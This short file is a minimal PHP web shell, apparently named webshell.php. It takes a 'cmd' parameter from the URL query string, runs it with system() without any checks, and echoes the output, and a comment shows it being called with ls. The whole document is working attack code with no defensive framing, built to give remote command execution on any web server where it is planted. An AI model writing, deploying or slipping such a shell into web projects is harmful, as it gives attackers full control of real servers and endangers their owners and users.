<?php
  $command = $_GET['cmd'];
  echo system($command);
?>

# usage examples
# url/webshell.php?cmd=ls